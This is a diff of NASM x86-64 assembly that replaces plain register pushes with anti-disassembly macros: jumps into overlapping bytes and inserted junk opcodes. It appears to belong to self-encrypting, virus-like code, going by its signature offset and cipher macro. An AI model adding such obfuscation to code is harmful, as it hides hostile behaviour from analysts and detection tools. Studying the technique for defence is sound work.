@@ -55,16 +55,71 @@
 
 %define SIGNATURE_OFFSET	signature - _start + 41
 
+
 ; MACROS
+
+%macro OBF_GENERIC 0
+jmp short 0x4
+db 0xe9
+dw 0xefff
+%endmacro
+
+%macro OBF_PUSH_RAX 0
+	jmp short 5
+	push 0x500fDD90
+%endmacro
+
+
+%macro OBF_PUSH_RBX 0
+	jmp short 5
+	push 0x53909090
+%endmacro
+
+%macro OBF_PUSH_RCX 0
+	jmp short 5
+	push 0x5146EEF0
+%endmacro
+
+%macro OBF_PUSH_RDX 0
+	jmp short 6
+	db 0xF8
+	push 0x5246EEF0
+%endmacro
+
+%macro OBF_PUSH_RSI 0
+	jmp short 5
+	db 0xF8
+	dd 0x5646EEF0
+%endmacro
+
+%macro OBF_PUSH_RDI 0
+	jmp short 5
+	db 0x03
+	dd 0x5702EEc0
+%endmacro
+
+%macro OBF_PUSH_RBP 0
+	jmp short 5
+	db 0x03
+	dd 0x55380F66
+%endmacro
+
+%macro OBF_PUSH_RSP 0
+	jmp short 5
+	db 0x03
+	dd 0x543A0F66
+%endmacro
+
 %macro PUSH 0
-	push rax
-	push rbx
-	push rcx
-	push rdx
-	push rsi
-	push rdi
-	push rbp
-	push rsp
+	OBF_PUSH_RAX
+	OBF_PUSH_RBX
+	OBF_PUSH_RCX
+	OBF_PUSH_RDX
+	OBF_GENERIC
+	OBF_PUSH_RSI
+	OBF_PUSH_RDI
+	OBF_PUSH_RBP
+	OBF_PUSH_RSP
 	push r8
 	push r9
 	push r10
@@ -92,6 +147,8 @@
 	pop rbx
 	pop rax
 %endmacro
+
+
 
 %macro CYPHER 0
 	xor r11, r11
